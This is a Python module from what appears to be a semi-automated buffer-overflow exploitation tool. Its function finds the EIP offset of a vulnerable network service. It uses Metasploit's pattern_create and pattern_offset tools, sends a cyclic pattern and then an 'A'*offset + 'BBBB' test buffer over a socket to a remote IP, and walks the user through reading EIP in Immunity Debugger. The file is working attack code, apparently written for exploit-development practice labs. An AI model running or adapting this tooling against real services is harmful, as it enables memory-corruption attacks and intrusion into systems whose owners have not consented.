import socket
import subprocess

from BunnyConfig import BunnyConfig
from BunnyBanners import BunnyBanners
from termcolor import colored


class BunnyOffset:
    @staticmethod
    def FindEIPOffset():

        BunnyBanners.PrintEipOffsetBanner()

        pattern = ""

        if BunnyConfig.crashCount == 0:
            temp_crashedOn = input("It appears you did not run the fuzzing operation. How big of a pattern would you "
                                   "like to generate (type c to cancel)? ")
            if temp_crashedOn == 'c' or temp_crashedOn == 'C':
                return False
            else:
                BunnyConfig.crashCount = int(temp_crashedOn)

        print(colored("\n\nNow that we have figured out when the program crashes, we can move onto finding the eip\n"
                      "offset. To do this, we will send a unique sequence of characters to the target. This pattern\n"
                      "should overwrite the EIP. After the sequence has been sent, you will need to enter the value\n"
                      "displayed in the EIP field of the debugger. This should be located in the top right quadrant\n"
                      "of the Immunity debugger. once you have entered that value, the script will determine the\n"
                      "offset based on the unique sequence of characters we sent.\n\n"
                      "As a final step before we move onto the next operation, we will verify that our offset is\n"
                      "correct by sending another payload and ensuring you see '42424242' in the EIP field.\n\n", "green"))
        input(colored(
            "Please ensure that the vulnerable program is loaded and running inside Immunity on the target. If you\n"
            "ran another operation before this one, make sure to reset the debugger and press enter to start...",
            "yellow"))

        # Here we are going to use the number of bytes the program crashed on to generate a pattern so that we can
        # get the exact offset of the EIP
        args = ["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", "-l", str(BunnyConfig.crashCount)]

        proc = subprocess.Popen(args, stdout=subprocess.PIPE)

        while True:
            line = proc.stdout.readline()
            if not line:
                if not pattern:
                    input(colored("Error generating a pattern ", "red"))
                    return False
                break
            else:
                pattern = line

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(BunnyConfig.socketTimeout)
        connect = s.connect((BunnyConfig.remote_ip, BunnyConfig.remote_port))

        s.send(BunnyConfig.operation + b" " + pattern)
        s.close()

        eip_pattern = input(colored("\nCheck EIP in the debugger. What is the value of EIP? ", 'yellow'))

        args = ["/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb", "-l", str(BunnyConfig.crashCount), "-q", eip_pattern]

        proc = subprocess.Popen(args, stdout=subprocess.PIPE)

        while True:
            line = proc.stdout.readline()
            if not line:
                if BunnyConfig.eip_offset == 0:
                    input(colored("Error getting eip offset ", "red"))
                    return False
                break
            else:
                splitLine = str(line).replace("\\n'", "").split()
                BunnyConfig.eip_offset = int(splitLine[-1:][0])

        print(colored("\nOffset is: " + str(BunnyConfig.eip_offset), "green"))
        input(colored("\n\nReset the debugger and press enter to continue", 'yellow'))
        print(colored("\nLet's verify our offset is correct\n\n", "green"))

        buffer = b"A" * + BunnyConfig.eip_offset + b"BBBB"

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(BunnyConfig.socketTimeout)
            connect = s.connect((BunnyConfig.remote_ip, BunnyConfig.remote_port))

            s.send(BunnyConfig.operation + b" " + buffer)
            s.close()
        except:
            input(colored("Unable to connect to " + BunnyConfig.remote_ip + " on port " + BunnyConfig.remote_port, "red"))
            return False

        print(colored("You should see 42424242 in the EIP.", "green"))

        confirm = input(colored("Do you see 42424242 in the EIP field (Y/n)? ", "yellow"))

        if confirm == 'Y' or confirm == 'y' or confirm == '':
            print(colored("EIP Offset verification complete!", "green"))
        else:
            input(colored("Our offset does not appear to be correct. Please run this operation again and\n"
                          "ensure the value of EIP is correct. If the value is correct, you may need to\n"
                          "go back and run the fuzzing operation again...", "red"))
            return False

        input(colored("\n\nreset the debugger and hit enter to continue", 'yellow'))
        return True
